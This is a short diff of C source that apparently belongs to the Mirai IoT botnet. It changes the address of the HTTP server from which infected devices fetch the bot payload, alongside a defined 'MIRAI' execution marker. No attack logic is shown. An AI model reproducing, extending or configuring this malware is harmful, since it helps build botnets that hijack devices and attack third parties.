@@ -5,7 +5,7 @@
 #include <sys/socket.h>
 #include <netinet/in.h>
 
-#define HTTP_SERVER utils_inet_addr(192,168,0,124) // CHANGE TO YOUR HTTP SERVER IP
+#define HTTP_SERVER utils_inet_addr(192,168,0,5) // CHANGE TO YOUR HTTP SERVER IP
 
 #define EXEC_MSG            "MIRAI\n"
 #define EXEC_MSG_LEN        6
